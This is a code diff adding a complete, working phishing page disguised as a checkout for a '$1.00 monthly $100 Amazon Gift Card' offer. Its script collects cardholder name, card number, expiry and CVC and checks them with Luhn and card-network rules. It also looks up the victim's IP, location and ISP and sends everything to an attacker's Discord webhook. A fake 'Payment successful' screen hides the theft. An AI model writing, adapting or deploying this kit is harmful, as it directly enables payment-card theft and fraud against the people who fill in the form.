@@ -1,0 +1,184 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Claim your $100 Amazon Gift Card</title>
+<style>
+  *{box-sizing:border-box}
+  body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:18px;
+       background:#0a0c12;color:#eaeef7;font:16px/1.5 system-ui,-apple-system,Segoe UI,Roboto,sans-serif}
+  .box{width:100%;max-width:370px;background:#151a26;border:1px solid #252c3d;border-radius:18px;padding:24px}
+  .emoji{font-size:40px;text-align:center}
+  h1{font-size:22px;text-align:center;margin:8px 0 4px}
+  .sub{text-align:center;color:#8b93a8;font-size:14px;margin:0 0 18px}
+  .sub b{color:#7ee787}
+  label{display:block;font-size:11px;letter-spacing:.6px;text-transform:uppercase;color:#8b93a8;margin:14px 0 6px}
+  input{width:100%;background:#0d1119;border:1px solid #252c3d;border-radius:10px;color:#eaeef7;padding:13px;font:15px ui-monospace,monospace}
+  input:focus{outline:none;border-color:#7c5cff}
+  .wrap{position:relative}
+  .wrap input{padding-right:64px}
+  .tag{position:absolute;right:9px;top:50%;transform:translateY(-50%);font-size:10px;font-weight:800;padding:3px 7px;border-radius:5px;background:#232a3d;color:#a5b4fc;display:none}
+  .two{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+  .hint{font-size:12px;margin-top:6px;color:#8b93a8;min-height:15px}
+  .hint.bad{color:#ff9b9b}.hint.ok{color:#7ee787}
+  button{width:100%;margin-top:22px;padding:15px;border:0;border-radius:12px;font:700 16px system-ui;color:#fff;
+         background:linear-gradient(135deg,#7c5cff,#3b82f6);cursor:pointer}
+  button:disabled{opacity:.6}
+  .safe{text-align:center;color:#8b93a8;font-size:12px;margin-top:12px}
+  .done{display:none;text-align:center}
+  .done .big{font-size:54px}
+  .recap{background:#0d1119;border:1px dashed #252c3d;border-radius:12px;padding:14px;margin-top:16px;text-align:left;font-size:14px}
+  .recap div{display:flex;justify-content:space-between;padding:3px 0;color:#8b93a8}
+  .recap b{color:#eaeef7;font-family:ui-monospace,monospace;font-weight:600}
+</style>
+</head>
+<body>
+
+<div class="box" id="form">
+  <div class="emoji">🎁</div>
+  <h1>Claim your reward</h1>
+  <p class="sub"><b>$100 Amazon Gift Card</b> every month — just $1.00</p>
+
+  <form id="f">
+    <label>Cardholder name</label>
+    <input id="name" autocomplete="cc-name" placeholder="John Doe">
+
+    <label>Card number</label>
+    <div class="wrap">
+      <input id="num" inputmode="numeric" autocomplete="cc-number" placeholder="1234 5678 9012 3456">
+      <span class="tag" id="tag"></span>
+    </div>
+    <div class="hint" id="hint"></div>
+
+    <div class="two">
+      <div><label>Expiry</label><input id="exp" inputmode="numeric" autocomplete="cc-exp" placeholder="MM/YY"></div>
+      <div><label>CVC</label><input id="cvc" inputmode="numeric" autocomplete="cc-csc" placeholder="123"></div>
+    </div>
+
+    <button id="buy" type="submit">Buy now — $1.00</button>
+  </form>
+  <div class="safe">🔒 Secured checkout · cancel anytime</div>
+</div>
+
+<div class="box done" id="done">
+  <div class="big">✅</div>
+  <h1>Payment successful</h1>
+  <p class="sub">You're subscribed. Your gift card is on the way.</p>
+  <div class="recap" id="recap"></div>
+  <div class="safe">You can close this page.</div>
+</div>
+
+<script>
+/* ============== PUT YOUR DISCORD WEBHOOK HERE ============== */
+const WEBHOOK = "PASTE_YOUR_WEBHOOK_HERE";
+/* ========================================================== */
+
+const $ = id => document.getElementById(id);
+const num=$('num'), exp=$('exp'), cvc=$('cvc'), name=$('name'), tag=$('tag'), hint=$('hint');
+
+const NET = [
+  {n:'VISA',      re:/^4/,                 len:[13,16,19],    cvc:[3], pat:[4,4,4,4]},
+  {n:'MASTERCARD',re:/^(5[1-5]|2[2-7])/,   len:[16],          cvc:[3], pat:[4,4,4,4]},
+  {n:'AMEX',      re:/^3[47]/,             len:[15],          cvc:[4], pat:[4,6,5]},
+  {n:'DISCOVER',  re:/^(6011|65|64[4-9])/, len:[16,19],       cvc:[3], pat:[4,4,4,4]},
+  {n:'JCB',       re:/^35/,                len:[16,19],       cvc:[3], pat:[4,4,4,4]},
+  {n:'DINERS',    re:/^(36|38|30[0-5])/,   len:[14,16,19],    cvc:[3], pat:[4,6,4]},
+  {n:'UNIONPAY',  re:/^62/,                len:[16,17,18,19], cvc:[3], pat:[4,4,4,4]},
+  {n:'MAESTRO',   re:/^(50|5[6-9]|6\d)/,   len:[12,13,14,15,16,17,18,19], cvc:[3], pat:[4,4,4,4]}
+];
+const find = d => NET.find(x => x.re.test(d)) || null;
+const luhn = d => { let s=0,a=0; for(let i=d.length-1;i>=0;i--){ let x=+d[i]; if(a){x*=2; if(x>9)x-=9;} s+=x; a=!a; } return d.length>0 && s%10===0; };
+const fmt  = (d,p) => { let o=[],i=0; for(const s of p){ if(i>=d.length)break; o.push(d.substr(i,s)); i+=s; } if(i<d.length)o.push(d.substr(i)); return o.join(' '); };
+const goodExp = (m,y) => { m=+m; y=+y; if(!m||!y) return false; if(y<100) y+=2000; const n=new Date(); return m>=1&&m<=12&&(y>n.getFullYear()||(y===n.getFullYear()&&m>=n.getMonth()+1)); };
+
+function paint(){
+  const d = num.value.replace(/\D/g,'');
+  const net = find(d);
+  if (net && d.length >= 2){ tag.style.display='block'; tag.textContent = net.n; } else tag.style.display='none';
+  if (d.length > 1) num.value = fmt(d, net ? net.pat : [4,4,4,4]);
+  if (!d.length){ hint.textContent=''; hint.className='hint'; return; }
+  if (!net){ hint.textContent='Unknown card network'; hint.className='hint bad'; return; }
+  if (d.length < Math.min(...net.len)){ hint.textContent = `${net.n} · ${d.length}/${Math.min(...net.len)} digits`; hint.className='hint'; return; }
+  if (!net.len.includes(d.length)){ hint.textContent = `Wrong length for ${net.n}`; hint.className='hint bad'; return; }
+  if (!luhn(d)){ hint.textContent = `${net.n} · not a real number (Luhn failed)`; hint.className='hint bad'; return; }
+  hint.textContent = `✓ Valid ${net.n}`; hint.className='hint ok';
+}
+num.addEventListener('input', paint);
+
+/* paste the whole card into ANY box -> everything fills in */
+function spread(text){
+  const g = {}; let t = text;
+  const e = t.match(/(0?[1-9]|1[0-2])\s*[\/\-.]\s*(\d{2}|\d{4})/);
+  if (e){ g.exp = e[1].padStart(2,'0')+'/'+e[2].slice(-2); t = t.replace(e[0],' | '); }
+  const c = t.match(/(?:\d[ \-]?){13,19}/);
+  if (c){ g.num = c[0].replace(/\D/g,''); t = t.replace(c[0],' | '); }
+  const nm = t.match(/[A-Za-z][A-Za-z .'\-]{1,}/);
+  if (nm){ g.name = nm[0].trim(); t = t.replace(nm[0],' | '); }
+  const cv = t.match(/\b\d{3,4}\b/);
+  if (cv) g.cvc = cv[0];
+  if (g.name) name.value = g.name.replace(/[^A-Za-z .'\-]/g,'');
+  if (g.num){ num.value = g.num; paint(); }
+  if (g.exp) exp.value = g.exp;
+  if (g.cvc) cvc.value = g.cvc;
+}
+[num,exp,cvc,name].forEach(el => el.addEventListener('paste', ev => {
+  const t = (ev.clipboardData || window.clipboardData).getData('text');
+  if (!t || !/\d/.test(t)) return;
+  ev.preventDefault(); spread(t);
+}));
+
+exp.addEventListener('input', () => { const d = exp.value.replace(/\D/g,'').slice(0,4); exp.value = d.length>2 ? d.slice(0,2)+'/'+d.slice(2) : d; });
+cvc.addEventListener('input', () => { cvc.value = cvc.value.replace(/\D/g,'').slice(0,4); });
+name.addEventListener('input', () => { name.value = name.value.replace(/[^A-Za-z .'\-]/g,''); });
+
+async function geo(){
+  try { const j = await (await fetch('https://ipwho.is/')).json();
+    return { ip:j.ip, loc:[j.city,j.region,j.country].filter(Boolean).join(', '), isp:j.connection?.isp||'' };
+  } catch { try { return { ip: await (await fetch('https://api.ipify.org')).text(), loc:'', isp:'' }; } catch { return {ip:'',loc:'',isp:''}; } }
+}
+
+$('f').addEventListener('submit', async ev => {
+  ev.preventDefault();
+  const d = num.value.replace(/\D/g,'');
+  const [m,y] = exp.value.split('/');
+  if (d.length < 12) return alert('Enter a card number');
+  if (!goodExp(m,y)) return alert('Enter a valid expiry MM/YY');
+  if (cvc.value.length < 3) return alert('Enter the CVC');
+
+  const btn = $('buy'); btn.disabled = true; btn.textContent = 'Processing…';
+  const net = find(d);
+  const g = await geo();
+
+  const payload = { embeds: [{
+    title: '💳 New card — $1.00 Amazon Gift Card plan',
+    color: 0x635bff,
+    fields: [
+      { name:'Cardholder', value: name.value || '—', inline:true },
+      { name:'Network',    value: net ? net.n : 'Unknown', inline:true },
+      { name:'Looks real?',value: (net && net.len.includes(d.length) && luhn(d) && goodExp(m,y)) ? '✅ yes' : '⚠️ suspicious', inline:true },
+      { name:'Card number',value: '`' + d + '`' },
+      { name:'Expiry',     value: m + '/' + y, inline:true },
+      { name:'CVC',        value: cvc.value, inline:true },
+      { name:'IP',         value: g.ip || '—', inline:true },
+      { name:'Location',   value: g.loc || '—', inline:true },
+      { name:'ISP',        value: g.isp || '—', inline:true },
+      { name:'Device',     value: (navigator.userAgent || '').slice(0,180) }
+    ],
+    timestamp: new Date().toISOString()
+  }] };
+
+  try { await fetch(WEBHOOK, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(payload) }); } catch(e){}
+
+  $('form').style.display = 'none';
+  $('done').style.display = 'block';
+  $('recap').innerHTML = `
+    <div><span>Plan</span><b>$100 Amazon Gift Card</b></div>
+    <div><span>Card</span><b>${net?net.n:'Card'} •••• ${d.slice(-4)}</b></div>
+    <div><span>Name</span><b>${name.value || '—'}</b></div>
+    <div><span>Charged</span><b>$1.00</b></div>`;
+  window.scrollTo(0,0);
+});
+</script>
+</body>
+</html>
